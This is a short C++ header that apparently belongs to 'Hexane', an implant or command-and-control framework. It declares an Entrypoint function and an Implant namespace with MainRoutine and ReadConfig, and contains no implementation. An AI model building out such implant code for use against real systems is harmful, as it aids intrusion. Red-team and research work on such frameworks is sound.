#ifndef HEXANE_CORELIB_BASE_HPP
#define HEXANE_CORELIB_BASE_HPP
#include <monolith.hpp>
#include <core/corelib/corelib.hpp>

EXTERN_C FUNCTION VOID Entrypoint(HMODULE Base);

namespace Implant {
    FUNCTION VOID MainRoutine();
    FUNCTION VOID ReadConfig();
}

#endif //HEXANE_CORELIB_BASE_HPP